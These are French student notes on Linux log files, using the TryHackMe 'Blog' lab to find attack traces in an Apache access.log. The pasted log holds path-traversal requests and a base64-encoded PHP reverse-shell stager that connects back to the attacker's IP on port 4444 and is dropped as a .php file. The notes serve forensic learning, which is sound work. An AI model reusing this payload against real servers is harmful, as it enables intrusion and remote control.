# Les fichiers de logs sur un système de type Linux.

Dans le domaine informatique, le terme log désigne un type de fichier, ou une entité équivalente, dont la mission 
principale consiste à stocker un historique des événements. Diminutif de logging, le terme peut être traduit en français 
par "journal". Le log s'apparente ainsi à un journal de bord horodaté, qui ordonne les différents événements qui se sont 
produits sur un ordinateur, un serveur, etc. Il permet ainsi d'analyser heure par heure, voire minute par minute, 
l'activité interne d'un processus.

De base les fichiers avec les logs sont à l'emplacement /var/log

Pour les afficher par ordre anti-chronologique, tapez :

``ls -lrt /var/log``

- Sachant que par défaut les logs sont surtout dans le fichier /var/log/messages voir /var/log/syslog


* Chercher au moins 1 trace de vos attaques grâce aux logs concernant l'activité 'blog'. (Faisable en groupe).

### Repère les trace laissée par les étapes de hack de l'activité TryHackMe - blog

Uune fois en place dans le système au moyen de l'exploit '', on crée notre shell.
En faisant une recherche ``find / -type f -name *.log``

Dans les fichier de Apache2, le fichier "access.log" contient des traces de notre passage

```
10.9.1.73 - - [20/Aug/2021:05:46:05 +0000] "GET / HTTP/1.1" 200 32348 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:10 +0000] "POST /wp-login.php HTTP/1.1" 302 1009 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:11 +0000] "GET / HTTP/1.1" 200 32348 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
127.0.0.1 - - [20/Aug/2021:05:46:08 +0000] "POST /wp-cron.php?doing_wp_cron=1629438368.2742478847503662109375 HTTP/1.1" 200 166 "http://blog.thm/wp-cron.php?doing_wp_cron=1629438368.2742478847503662109375" "WordPress/5.0; http://blog.thm"
10.9.1.73 - - [20/Aug/2021:05:46:12 +0000] "GET /wp-admin/media-new.php HTTP/1.1" 200 22247 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:31 +0000] "POST /wp-admin/async-upload.php HTTP/1.1" 200 1521 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 7460 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 541 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:33 +0000] "GET /wp-admin/post.php?post=37&action=edit HTTP/1.1" 200 41729 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:41 +0000] "POST /wp-admin/post.php HTTP/1.1" 302 397 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
127.0.0.1 - - [20/Aug/2021:05:46:47 +0000] "GET /wp-content/uploads/2021/08/fUaHedBrhQ-e1629438393828.jpg?/x HTTP/1.0" 200 3290 "-" "-"
127.0.0.1 - - [20/Aug/2021:05:46:47 +0000] "GET /wp-content/uploads/2021/08/fUaHedBrhQ-e1629438393828.jpg?/x HTTP/1.0" 200 3290 "-" "-"
10.9.1.73 - - [20/Aug/2021:05:46:47 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1243 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:48 +0000] "POST /wp-admin/post.php HTTP/1.1" 302 397 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
127.0.0.1 - - [20/Aug/2021:05:46:54 +0000] "GET /wp-content/uploads/2021/08/fUaHedBrhQ-e1629438393828.jpg?/../../../../themes/twentytwenty/gwJXGLRbBI HTTP/1.0" 200 3290 "-" "-"
127.0.0.1 - - [20/Aug/2021:05:46:54 +0000] "GET /wp-content/uploads/2021/08/fUaHedBrhQ-e1629438393828.jpg?/../../../../themes/twentytwenty/gwJXGLRbBI HTTP/1.0" 200 3290 "-" "-"
10.9.1.73 - - [20/Aug/2021:05:46:54 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1373 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:46:55 +0000] "POST /wp-admin/post-new.php HTTP/1.1" 200 218754 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:03 +0000] "POST /wp-admin/post.php HTTP/1.1" 302 397 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:10 +0000] "GET /?p=40&0=echo%20YmFzZTY0c3BvdHRlZAo%3d%20%7c%20base64%20-d HTTP/1.1" 200 3410 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:11 +0000] "GET /?p=40&0=echo%20Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjkuMS43Myc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%20%7c%20base64%20-d%20%3e%20pcYOXSpyFx.php HTTP/1.1" 200 3396 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 9658 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 376 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 376 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:34 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 376 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:34 +0000] "GET /wp-admin/edit.php HTTP/1.1" 200 49062 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:42 +0000] "GET /wp-admin/post.php?post=40&action=trash&_wpnonce=17232bdb53 HTTP/1.1" 302 399 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:49 +0000] "GET /wp-admin/edit.php?post_status=trash&post_type=post&_wpnonce=17232bdb53 HTTP/1.1" 200 42266 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.9.1.73 - - [20/Aug/2021:05:47:56 +0000] "GET /wp-admin/post.php?post=40&action=delete&_wpnonce=bdd62d2b71 HTTP/1.1" 302 392 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
```

### Sources
* https://www.tutos.eu/1596
* https://www.justegeek.fr/la-gestion-des-logs-sous-linux/
* https://www.journaldunet.fr/web-tech/dictionnaire-du-webmastering/1203463-log-definition-traduction/#:~:text=Le%20log%20s'apparente%20ainsi,activit%C3%A9%20interne%20d'un%20processus.